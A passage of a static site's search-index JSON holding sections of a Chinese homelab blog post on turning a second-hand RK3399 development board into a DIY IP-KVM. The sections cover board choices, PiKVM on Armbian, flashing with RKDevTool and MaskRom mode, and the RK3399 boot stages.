<p></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5df2\u77e5\u7684\u5f00\u53d1\u677f\u53ca\u8d44\u6599","title":"\u5df2\u77e5\u7684\u5f00\u53d1\u677f\u53ca\u8d44\u6599","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#firefly","title":"Firefly","text":"<p>Firefly\uff1a\u4e2d\u5c71\u5e02\u5929\u542f\u667a\u80fd\u79d1\u6280\u6709\u9650\u516c\u53f8\u4e8e2014\u5e74\u521b\u7acb\u7684\u5f00\u6e90\u56e2\u961f\uff0c\u81f4\u529b\u4e8e\u4eba\u5de5\u667a\u80fd\u3001\u667a\u80fd\u786c\u4ef6\u3001\u5d4c\u5165\u5f0f\u5f00\u53d1\u3001\u7cfb\u7edf\u5f00\u53d1\u3001\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u7b49\u7814\u53d1\uff0c\u62e5\u6709\u5f00\u6e90\u7cfb\u5217\u4ea7\u54c1\u3001\u5f00\u6e90\u793e\u533a\u4e0e\u7f51\u4e0a\u5546\u57ce\u3002Firefly \u5f00\u6e90\u4ea7\u54c1\u5305\u62ec\u6838\u5fc3\u677f\u3001\u884c\u4e1a\u4e3b\u677f\u3001\u884c\u4e1a\u6574\u673a\u3001\u96c6\u7fa4\u670d\u52a1\u5668\u3001\u5f00\u53d1\u5957\u4ef6\u3001Station\u7b49\u4ea7\u54c1\u3002</p> <p>\u8d44\u6599\u6700\u5168\u7684\u5f00\u53d1\u677f\uff0c\u5382\u5bb6\u6709\u81ea\u5df1\u7684\u7f51\u7ad9\uff0c\u63d0\u4f9b\u8be6\u7ec6\u6559\u7a0b\u3002 1. \u4ecb\u7ecd \u2014 Firefly Wiki (t-firefly.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#king3399","title":"king3399","text":"<p>\u5bb9\u54c1\u6df1\u5733\u7535\u5b50\u79d1\u6280 \u4ece\u54b8\u9c7c\u8d2d\u4e70\uff0c\u5356\u5bb6\u63d0\u4f9b\u4e86\u539f\u5382\u7684\u8be6\u7ec6\u6587\u6863\uff0c\u5305\u542b\uff1aSDK\uff08\u9002\u914d\u7684buildroot, ubuntu, debian, Android\u6e90\u7801\uff0c\u4ee5\u53ca\u7f16\u8bd1\u65b9\u6cd5\uff09\uff0c\u7f16\u8bd1\u597d\u7684\u955c\u50cf\uff0c\u786c\u4ef6datasheet\u7b49</p> <p>\u745e\u82af\u5fae King3399 \u6269\u5c55\u677f - \u6df1\u5733\u8363\u54c1\u7535\u5b50\u79d1\u6280\u6709\u9650\u516c\u53f8 (rpdzkj.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#tn3399_v3","title":"tn3399_v3","text":"<p>\u6df1\u5733\u5e02\u5929\u8bfa</p> <p>github\u4e0a\u6709\u4eba\u6298\u817e\u51fa\u7684\u8d44\u6599\uff0c\u4e5f\u652f\u6301\u5237\u8bb8\u591a\u7cfb\u7edf\u4e86\uff1alanseyujie/tn3399_v3: TN3399_V3 \u5f00\u53d1\u677f\u6298\u817e\u8bb0\u5f55 (github.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5176\u5b83","title":"\u5176\u5b83","text":"<ul> <li>RK\u5e73\u53f0\u8d44\u6599\u6536\u96c6\uff1aXianlee's Log (lightembedded.com)</li> </ul>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u65b9\u6848\u8ba8\u8bba","title":"\u65b9\u6848\u8ba8\u8bba","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u672c\u65b9\u6848","title":"\u57fa\u672c\u65b9\u6848","text":"<p>DIY \u4e00\u4e2a\u8fd0\u7ef4\u795e\u5668 Open IP-KVM - \u77e5\u4e4e (zhihu.com) \u8fd9\u79cd\u65b9\u6848\u5982\u4f55\u5462\uff1a 1.\u4f7f\u7528CH9329+CH340\u6a21\u62df\u9f20\u6807\u952e\u76d8 2.HDMI-USB\u89c6\u9891\u91c7\u96c6\u5361\u83b7\u53d6\u56fe\u50cf 3.ARM\u5f00\u53d1\u677f\u5b89\u88c5Linux\u7cfb\u7edf 4.GPIO\u6269\u5c55\u677f\u63a7\u5236\u76ee\u6807\u7535\u8111\u7684\u5f00\u5173\u673a\u5f15\u811a\u5b9e\u73b0\u5f00\u5173\u673a 5.\u91c7\u7528\u8fdc\u7a0b\u5149\u9a71\u955c\u50cf\u5171\u4eab\u6280\u672f\u3002\u5ba2\u6237\u7aef\u9009\u62e9\u5b89\u88c5\u7684\u5149\u76d8\u955c\u50cf,\u901a\u8fc7IP-KVM\u7f51\u7edc\u53d1\u9001\u5230\u5f00\u53d1\u677f\u3002\u5f00\u53d1\u677f\u63a5\u6536\u5230\u540e,\u901a\u8fc7iSCSI\u7b49\u7f51\u7edc\u534f\u8bae,\u5c06\u8be5\u5149\u76d8\u955c\u50cf\u6302\u8f7d\u4e3a\u76ee\u6807\u7535\u8111\u7684\u4e00\u5757\u865a\u62df\u5149\u76d8\u3002\u76ee\u6807\u7535\u8111\u53ef\u4ee5\u5bf9\u8be5\u865a\u62df\u5149\u76d8\u8fdb\u884c\u5f15\u5bfc\u548c\u5b89\u88c5\u64cd\u4f5c</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#arm-kvm","title":"ARM-KVM","text":"<p>b \u7ad9\u770b\u5230 IPKVM \u7684\u4e00\u4e2a\u65b9\u6848\uff0c\u8bf7\u6559\u4e0b\u600e\u4e48\u5b9e\u73b0 - V2EX - \u300c\u6559\u7a0b\u300d\u5ec9\u4ef7\u7684\u8fd0\u7ef4\u795e\u5668 ArmKVM \u5b89\u88c5\u4e0e\u4f7f\u7528_\u54d4\u54e9\u54d4\u54e9_bilibili - ArmKVM \u5b98\u65b9\u6587\u6863 (moeneko.xyz) - B\u7ad9\u4f5c\u8005\u5df2\u7ecf\u628a\u5b83\u5546\u4e1a\u91cf\u4ea7\u4e86\uff0c\u4f46\u662f\u552e\u4ef7330\u8d77   - CPU\u662f\u5168\u5fd7H610\uff0c\u611f\u89c9\u4ec0\u4e48\u90fd\u7f29\u6c34\u4e86\uff0c\u9664\u4e86\u677f\u5b50\u662f\u65b0\u7684\u5916\uff0c\u76f8\u6bd4\u4e8e\u81ea\u5df1\u4e70\u4e8c\u624b\u5f00\u53d1\u677fDIY\u6ca1\u6709\u6027\u4ef7\u6bd4\u3002   - \u800c\u4e14\u7cfb\u7edf\u4e5f\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\uff0c\u611f\u89c9\u53ef\u73a9\u6027\u6bd4\u8f83\u5dee</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u4e8earmbian\u7684pi-kvm","title":"\u57fa\u4e8eArmbian\u7684PI-KVM","text":"<ul> <li>\u5c06PI-KVM\u79fb\u690d\u5230\u4e86Armbian\u7cfb\u7edf\u4e0a</li> <li>\u6253\u9020\u666e\u901aPC\u62e5\u6709\u670d\u52a1\u5668IPMI\u786c\u4ef6\u7ea7\u522b\u7684\u8fdc\u7a0b\u8fd0\u7ef4\u65b9\u6848 PI KVM \u786c\u4ef6\u7ea7\u8fdc\u7a0b\u63a7\u5236_\u54d4\u54e9\u54d4\u54e9_bilibili</li> <li>\u6559\u7a0b https://github.com/toss-a/pikvm-armbian/blob/master/README-zh-CN.MD</li> <li>\u4f5c\u8005\u7684\u4ed3\u5e93\uff1asrepac/kvmd-armbian: KVMD For Armbian Install Script (github.com)</li> </ul> <p>\u53ea\u9700\u8981\u5f00\u53d1\u677f\u53ef\u4ee5\u5237Armbian\u7684\u955c\u50cf\uff0c\u786c\u4ef6\u6709\u652f\u6301OTG\u7684USB\u63a5\u53e3\u5373\u53ef\u3002\u975e\u5e38\u9002\u5408\u81ea\u5df1DIY\u7684\u65b9\u6848</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#king3399\u5237\u673a","title":"king3399\u5237\u673a","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u6559\u7a0b\u94fe\u63a5","title":"\u6559\u7a0b\u94fe\u63a5","text":"<p>2022 \u5e74\u65b0\u9c9c\u77ff\u6e23\uff0c\u8363\u54c1 king3399 Linux \u5237\u673a\u6559\u7a0b\u4e0e\u6027\u80fd\u6d4b\u8bd5 - YouTube King3399/\u8363\u54c13399\u5237\u673a\u6559\u7a0b - \u5fc3\u8bed\u535a\u5ba2 (vpset.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u539f\u5382\u955c\u50cfvs\u7b2c\u4e09\u65b9","title":"\u5237\u539f\u5382\u955c\u50cfvs\u7b2c\u4e09\u65b9","text":"<p>\u5f00\u53d1\u677f\u5382\u5bb6\u63d0\u4f9b\u7684SDK\u5305\u4e2d\u4f1a\u5305\u542b\u539f\u5382\u955c\u50cf\uff0c\u50cfFirefly\u5219\u53ef\u4ee5\u4ece\u5b98\u7f51\u4e0b\u8f7d\u3002 \u5237\u539f\u5382\u955c\u50cf\uff1a - \u4f18\u70b9   - \u7ecf\u8fc7\u5382\u5bb6\u6d4b\u8bd5\uff0c\u6bd4\u8f83\u7a33\u5b9a   - \u5237\u673a\u6bd4\u8f83\u5bb9\u6613 - \u7f3a\u70b9   - \u53ef\u80fd\u652f\u6301\u7684\u5185\u6838\u7248\u672c\u6bd4\u8f83\u4f4e   - \u955c\u50cf\u9009\u62e9\u6027\u6bd4\u8f83\u5c11\u3002\u53ef\u80fd\u5382\u5bb6\u53ea\u9002\u914d\u4e86debian,ubuntu\u955c\u50cf\u3002</p> <ul> <li>\u8981\u652f\u6301Armbian\uff0copenwrt\u7b49\u5176\u5b83\u64cd\u4f5c\u7cfb\u7edf\u9700\u8981\u81ea\u5df1\u79fb\u690d\u7f16\u8bd1\uff0c\u4e00\u822c\u9700\u8981\u677f\u5b50\u7684dtb\uff0c\u53ef\u4ee5\u4ece\u539f\u5382\u7cfb\u7edf\u4e2d\u63d0\u53d6\u3002\u901a\u5e38\u7f51\u4e0a\u6709\u5927\u4f6c\u79fb\u690d\u8fc7\u4e86</li> <li>king3399\u5382\u5bb6\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u7cfb\u7edf\u955c\u50cf</li> <li>linux<ul> <li>ubuntu(18.04)</li> <li>debian(buster 10)</li> </ul> </li> <li>android: 7, 8, 10</li> </ul>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u673a\u65b9\u6cd5","title":"\u5237\u673a\u65b9\u6cd5","text":"<p>Rockchip\u5e73\u53f0\u5237\u673a\u65b9\u6cd5\u6c47\u603b\uff1aXianlee's Log (lightembedded.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u672c\u77e5\u8bc6","title":"\u57fa\u672c\u77e5\u8bc6","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u955c\u50cf\u6587\u4ef6","title":"\u955c\u50cf\u6587\u4ef6","text":"<ul> <li>\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u90e8\u5206</li> <li>bootloader\uff08\u5982uboot\uff09</li> <li>kernel\uff08linux kernel\uff09</li> <li>rootfs\uff08ubuntu, debian\u7b49\u4e0d\u540c\u53d1\u884c\u7248\u90fd\u662f\u8be5\u90e8\u5206\u4e0d\u540c\uff09</li> <li>\u5e76\u4e14\u5404\u90e8\u5206\u6240\u5904\u5730\u5740\u7a7a\u95f4\u5206\u533a\u662fSoC\u5382\u5546\u5206\u914d\u597d\u7684\u3002</li> <li>\u5bf9\u4e8e\u5f00\u53d1\u677f\u8fd9\u79cd\u8bbe\u5907\uff0cCPU\u542f\u52a8\u65f6\u4f1a\u4ece\u7247\u4e0a\u7684\u4e00\u5c0f\u5757boot ROM\u542f\u52a8\uff0c\u4f5c\u4e3a\u7b2c0\u7ea7\u5f15\u5bfc\u3002\u4e4b\u540e\u518d\u4eceeMMC, SD\u5361\u7b49\u8bbe\u5907\u52a0\u8f7d\u5f15\u5bfc\u7a0b\u5e8f\u542f\u52a8\u3002\u56e0\u6b64\u955c\u50cf\u6587\u4ef6\u5305\u542b\u4ee5\u4e0a\u5168\u90e8\u90e8\u5206\uff0c\u53ea\u9700\u8981\u5c06\u955c\u50cf\u5b8c\u6574\u5199\u5165\u5916\u90e8\u5b58\u50a8\u3002\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\u4fbf\u4f1a\u4ece\u6b63\u786e\u4f4d\u7f6e\u5f00\u59cb\u5f15\u5bfc\u542f\u52a8</li> <li>\u5bf9\u4e8e\u8def\u7531\u5668\u5237openwrt\uff0cCPU\u901a\u5e38\u4eceflash\u542f\u52a8\u3002\u56e0\u6b64\u5237\u7cfb\u7edf\u65f6\u4e00\u822c\u53ea\u4f1a\u5237flash\u4e2dkernel + rootfs\u5206\u533a\u3002\u56e0\u4e3a\u4fdd\u7559\u539f\u5382bootloader\u53ef\u4ee5\u4fdd\u8bc1\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u539f\u5382\u5de5\u5177\u6062\u590d\u539f\u5382\u7cfb\u7edf\u3002\u540c\u65f6flash\u4e2d\u4e00\u4e9b\u5206\u533a\u8fd8\u5305\u542b\u7f51\u5361MAC\u5730\u5740\u7b49\u4fe1\u606f\uff0c\u56e0\u6b64\u4e0d\u80fd\u4fee\u6539\u3002</li> <li>buildroot\u9879\u76ee\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9a\u5236bootloader, kernel, rootfs\u8fd9\u4e09\u90e8\u5206\uff0c\u751f\u6210\u5b9a\u5236\u5316\u7684\u7cfb\u7edf\u955c\u50cf</li> </ul>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#boot-rom","title":"boot ROM","text":"<ul> <li>\u5f00\u53d1\u677f\u8fd9\u79cd\u8bbe\u5907\u6709\u7247\u4e0aboot ROM\u7684\u597d\u5904\u5c31\u662f\uff0c\u4e0d\u7528\u62c5\u5fc3\u53d8\u7816\u3002 <p>Firefly-RK3399 \u6709\u7075\u6d3b\u7684\u542f\u52a8\u65b9\u5f0f\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u786c\u4ef6\u635f\u574f\uff0cFirefly-RK3399 \u5f00\u53d1\u677f\u662f\u4e0d\u4f1a\u53d8\u7816\u7684\u3002\u5982\u679c\u5728\u5347\u7ea7\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u610f\u5916\uff0cbootloader \u635f\u574f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u91cd\u65b0\u5347\u7ea7\uff0c\u6b64\u65f6\u4ecd\u53ef\u4ee5\u8fdb\u5165\u00a0<code>MaskRom</code>\u00a0\u6a21\u5f0f\u6765\u4fee\u590d\u3002</p> </li> </ul>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u5165\u4ecb\u8d28","title":"\u5237\u5165\u4ecb\u8d28","text":"<p>\u8981\u770bSoC\u652f\u6301\u76f4\u63a5\u4ece\u54ea\u4e9b\u4f4d\u7f6e\u542f\u52a8\uff0c\u4e00\u822c\u652f\u6301SD/tf, eMMC\u3002\u4ece\u5176\u4f59\u5b58\u50a8\u4ecb\u8d28\u542f\u52a8\u53ef\u80fd\u9700\u8981\u5148\u5c06bootloader\u5199\u5165\u677f\u8f7d\u5b58\u50a8\uff0c\u7136\u540e\u518d\u5c06\u5269\u4f59\u955c\u50cf\u5199\u5165\u5176\u5b83\u5b58\u50a8</p> <p>ROCK-5B \u5728\u4e3b\u677f\u4e0a\u6709\u4e00\u4e2a SPI \u95ea\u5b58\uff0c\u5c06\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u5b89\u88c5\u5230 SPI \u95ea\u5b58\u53ef\u4ee5\u652f\u6301 SoC maskrom \u6a21\u5f0f\u4e0d\u76f4\u63a5\u652f\u6301\u7684\u5176\u4ed6\u542f\u52a8\u4ecb\u8d28\uff08\u5982 SATA\u3001USB3 \u6216 NVMe\uff09 https://github.com/ophub/amlogic-s9xxx-armbian/blob/main/build-armbian/documents/README.cn.md#8213-%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F%E8%87%B3-nvme</p> <p>\u5c06\u955c\u50cf\u5199\u5165SD\u5361\u8fd9\u79cd\u5916\u90e8\u5b58\u50a8\u6bd4\u8f83\u5bb9\u6613   - Rufus - Create bootable USB drives the easy way   - balenaEtcher - Flash OS images to SD cards &amp; USB drives</p> <p>\u4f46\u662f\u8981\u5c06\u955c\u50cf\u5199\u5165\u677f\u8f7d\u7684eMMC\u5b58\u50a8\u5219\u9700\u8981\u4e13\u95e8\u7684\u5de5\u5177 - \u4e00\u822c\u8fd9\u79cd\u677f\u8f7d\u5b58\u50a8\u90fd\u6709\u5b98\u65b9\u5f00\u53d1\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u5199\u3002\u6bd4\u5982Rochchip\u63d0\u4f9b\u4e86RKDevTool\uff0c\u901a\u8fc7USB\u8fde\u63a5\u4e0a\u4f4d\u673a\u548c\u5f00\u53d1\u677f\uff0c\u5f00\u53d1\u677f\u542f\u52a8\u65f6\uff0cboot ROM\u53ef\u4ee5\u63a5\u53d7\u4eceUSB\u83b7\u5f97loader\u542f\u52a8\uff0c\u4e4b\u540e\u518d\u4eceUSB\u83b7\u5f97\u6570\u636e\uff0c\u6700\u540e\u5199\u5165eMMC - \u4e5f\u53ef\u4ee5\u4e70\u4e00\u4e2aUSB-eMMC\u7684\u8f6c\u63a5\u5668\uff0c\u76f4\u63a5\u5199   - \u5237\u8def\u7531\u5668\u65f6\uff0c\u6211\u5c31\u4e70\u4e86\u4e00\u4e2a\u5199flash\u7684\u5de5\u5177\u3002</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rkdevtool\u4f7f\u7528","title":"RKDevTool\u4f7f\u7528","text":"<p>\u51e0\u79cd\u542f\u52a8\u6a21\u5f0f - Normal\uff1aNormal \u6a21\u5f0f\u5c31\u662f\u6b63\u5e38\u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u5404\u4e2a\u7ec4\u4ef6\u4f9d\u6b21\u52a0\u8f7d\uff0c\u6b63\u5e38\u8fdb\u5165\u7cfb\u7edf\u3002 - Loader\uff1a\u5728 Loader \u6a21\u5f0f\u4e0b\uff0cbootloader \u4f1a\u8fdb\u5165\u5347\u7ea7\u72b6\u6001\uff0c\u7b49\u5f85\u4e3b\u673a\u547d\u4ee4\uff0c\u7528\u4e8e\u56fa\u4ef6\u5347\u7ea7\u7b49\u3002 - MaskRom\uff1aMaskRom \u6a21\u5f0f\u7528\u4e8e bootloader \u635f\u574f\u65f6\u7684\u7cfb\u7edf\u4fee\u590d\u3002   - \u4e00\u822c\u60c5\u51b5\u4e0b\u662f\u4e0d\u7528\u8fdb\u5165\u00a0<code>MaskRom\u00a0\u6a21\u5f0f</code>\u7684\uff0c\u53ea\u6709\u5728 bootloader \u6821\u9a8c\u5931\u8d25\uff08\u8bfb\u53d6\u4e0d\u4e86 IDB \u5757\uff0c\u6216 bootloader \u635f\u574f\uff09 \u7684\u60c5\u51b5\u4e0b\uff0cBootRom \u4ee3\u7801 \u5c31\u4f1a\u8fdb\u5165\u6b64\u6a21\u5f0f\u3002\u6b64\u65f6 BootRom \u4ee3\u7801\u7b49\u5f85\u4e3b\u673a\u901a\u8fc7 USB \u63a5\u53e3\u4f20\u9001 bootloader \u4ee3\u7801\uff0c\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e4b\u3002\u5f53\u677f\u5b50\u53d8\u7816\u65e0\u6cd5\u6b63\u5e38\u542f\u52a8\u6216\u5347\u7ea7\u7a0b\u5e8f\u65f6\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u8fdb\u5165<code>MaskRom\u00a0\u6a21\u5f0f</code>.</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5982\u679ceMMC\u4e0a\u6709\u597d\u7684bootloader\uff0c\u5219\u542f\u52a8\u540e\u6309\u4f4f\u677f\u5b50\u4e0a\u7684update\u6309\u952e\u5c31\u4f1a\u8fdb\u5165loader\u6a21\u5f0f\uff0c\u7b49\u5f85\u4eceUSB\u83b7\u5f97\u955c\u50cf\u5347\u7ea7 \u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fdb\u5165Maskrom\u6a21\u5f0f\uff0c\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u76f4\u63a5\u5199\u6574\u4e2aeMMC\u3002\u4e0d\u8fc7\u6b64\u65f6\u4e0a\u4f4d\u673a\u8981\u63d0\u4f9b\u4e24\u4e2a\u6587\u4ef6 - loader\u6587\u4ef6\uff0cboot rom\u52a0\u8f7d\u540e\u5f15\u5bfc - \u8981\u5237\u5165eMMC\u7684\u7cfb\u7edf\u955c\u50cf</p> <p>\u677f\u8f7d16G eMMC\uff0c\u5199\u5e94\u8be5\u670940MB/s\uff0c\u6240\u4ee5\u5237\u673a\u901f\u5ea6\u8fd8\u662f\u5f88\u5feb\u7684\u3002</p> <p>\u8e29\u5751\u7ecf\u5386 - \u60f3\u76f4\u63a5\u4ece\u539f\u5382\u955c\u50cf\u5347\u7ea7\u4e3aarmbian\u955c\u50cf\uff0c\u53d1\u73b0\u9009\u62e9\u955c\u50cf\u76f4\u63a5\u5c31\u62a5\u9519\u8bef\u3002   - \u73b0\u5728\u89c9\u5f97\u662f\u4e8c\u8005bootloader\u4e0d\u4e00\u6837\uff0c\u5bfc\u81f4\u65e0\u6cd5\u76f4\u63a5\u5347\u7ea7\u3002 - \u7136\u540e\u60f3\u901a\u8fc7maskrom\u6a21\u5f0f\uff0c\u6309\u5730\u57400\u5199\u5165armbian\u955c\u50cf\u5373\u53ef\uff0c\u7ed3\u679c\u4e0d\u884c\u3002   - \u539f\u6765\u662f\u9700\u8981\u989d\u5916\u4e00\u4e2aloader\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5728armbian\u7684github\u4ed3\u5e93\u4e2d\u6709   - \u6211\u7684gihtub issue\u745e\u82af\u5fae\u5f00\u53d1\u5de5\u5177\u52a0\u8f7d\u56fa\u4ef6\u5931\u8d25 \u00b7 Issue #1562 \u00b7 ophub/amlogic-s9xxx-armbian (github.com)</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rk3399\u542f\u52a8\u8fc7\u7a0b\u63a2\u660e","title":"RK3399\u542f\u52a8\u8fc7\u7a0b\u63a2\u660e","text":"<ul> <li>Rockchip\u5b98\u65b9\u6587\u6863\uff1aBoot option - Rockchip open source Document (rock-chips.com)</li> </ul> <p>ATF\uff1aARM Trusted Firmware\u5206\u6790\u2014\u2014\u542f\u52a8\u3001PSCI\u3001OP-TEE\u63a5\u53e3 - ArnoldLu - \u535a\u5ba2\u56ed (cnblogs.com)) - arm\u5904\u7406\u5668\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u6d89\u53caARM\u7279\u6743\u7ea7\u5982ELF0\uff08\u666e\u901a\u5e94\u7528\uff09, ELF1\uff08kernel\uff09,ELF2(hypervisor) - \u4e3b\u8981\u6d89\u53ca\u5230BL1(bootrom) -&gt; BL2(pre-loader) -&gt; BL3x -&gt; uboot -&gt; kernel - BL1 - AP Trusted ROM\uff0c\u4e00\u822c\u4e3aBootRom\u3002 - BL2 - Trusted Boot Firmware\uff0c\u4e00\u822c\u4e3aTrusted Bootloader\u3002 - BL31 - EL3 Runtime Firmware\uff0c\u4e00\u822c\u4e3aSML\uff0c\u7ba1\u7406SMC\u6267\u884c\u5904\u7406\u548c\u4e2d\u65ad\uff0c\u8fd0\u884c\u5728secure monitor\u4e2d\u3002 - BL32 - Secure-EL1 Payload\uff0c\u4e00\u822c\u4e3aTEE OS Image\u3002 - BL33 - Non-Trusted Firmware\uff0c\u4e00\u822c\u4e3auboot\u3001linux kernel\u3002</p> <p></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#bootflow","title":"bootflow","text":"<pre><code>+--------+----------------+----------+-------------+---------+\n| Boot   | Terminology #1 | Actual   | Rockchip    | Image   |\n| stage  |                | program  |  Image      | Location|\n| number |                | name     |   Name      | (sector)|\n+--------+----------------+----------+-------------+---------+\n| 1      |  Primary       | ROM code | BootRom     |         |\n|        |  Program       |          |             |         |\n|        |  Loader        |          |             |         |\n|        |                |          |             |         |\n| 2      |  Secondary     | U-Boot   |idbloader.img| 0x40    | pre-loader\n|        |  Program       | TPL/SPL  |             |         |\n|        |  Loader (SPL)  |          |             |         |\n|        |                |          |             |         |\n| 3      |  -             | U-Boot   | u-boot.itb  | 0x4000  | including u-boot and atf\n|        |                |          | uboot.img   |         | only used with miniloader\n|        |                |          |             |         |\n|        |                | ATF/TEE  | trust.img   | 0x6000  | only used with miniloader\n|        |                |          |             |         |\n| 4      |  -             | kernel   | boot.img    | 0x8000  |\n|        |                |          |             |         |\n| 5      |  -             | rootfs   | rootfs.img  | 0x40000 |\n+--------+----------------+----------+-------------+---------+\n</code></pre> <p>Then when we talking about boot from eMMC/SD/U-Disk/net, they are in different concept: - Stage 1 is always in boot rom, it loads stage 2 and may load stage 3(when SPL_BACK_TO_BROM option enabled). - Boot from SPI flash means firmware for stage 2 and 3(SPL and U-Boot only) in SPI flash and stage 4/5 in other place; - Boot from eMMC means all the firmware(including stage 2, 3, 4, 5) in eMMC; - Boot from SD card means all the firmware(including stage 2, 3, 4, 5) in SD card; - Boot from U-Disk means firmware for stage 4 and 5(not including SPL and U-Boot) in Disk, optionally only including stage 5; - Boot from net/tftp means firmeware for stage 4 and 5(not including SPL and U-Boot) on the network;</p> <p>Boot Flow 1 is typical Rockchip boot flow with Rockchip miniloader; Boot Flow 2 is used for most SoCs with U-Boot TPL for ddr init and SPL for trust(ATF/OP-TEE) load and run into next stage;</p> <p></p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#armbian","title":"Armbian","text":"","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":"<p>Armbian\u662f\u517c\u5bb9debian\u7684\u4e13\u95e8\u9488\u5bf9\u5404\u79cdarm\u5f00\u53d1\u677f\u8fdb\u884c\u4f18\u5316\u7ef4\u62a4\u7684\u53d1\u884c\u7248\u3002\u7531\u4e8e\u66f4\u65b0\u6bd4\u8f83\u5373\u65f6\uff0c\u56e0\u6b64\u751a\u81f3\u53ef\u80fd\u6bd4\u539f\u5382\u955c\u50cf\u66f4\u52a0\u7a33\u5b9a\u3002</p> <p>\u548cRaspberry Pi OS, debian/arm\u5bf9\u6bd4\uff1a - Compared: Raspberry Pi OS vs. Armbian vs. Debian GNU/Linux (linuxhint.com) - Armbian doc faq: what-is-the-difference-between-armbian-and-debianubuntu</p>","tags":["KVM","rk3399","armbian"]},{"location":"homelab/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#amlogic-s9xxx-armbian\u9879\u76ee","title":"amlogic-s9xxx-armbian\u9879\u76ee","text":"<p>Armbian\u5b98\u65b9\u5e76\u6ca1\u6709\u76f4\u63a5\u652f\u6301king3399\uff08\u662f\u652f\u6301Firefly\u7684\uff09</p> <p>ophub/amlogic-s9xxx-armbian: Support for Armbian in Amlogic, Rockchip and Allwinner boxes. Support a311d, s922x, s905x3, s905x2, s912, s905d, s905x, 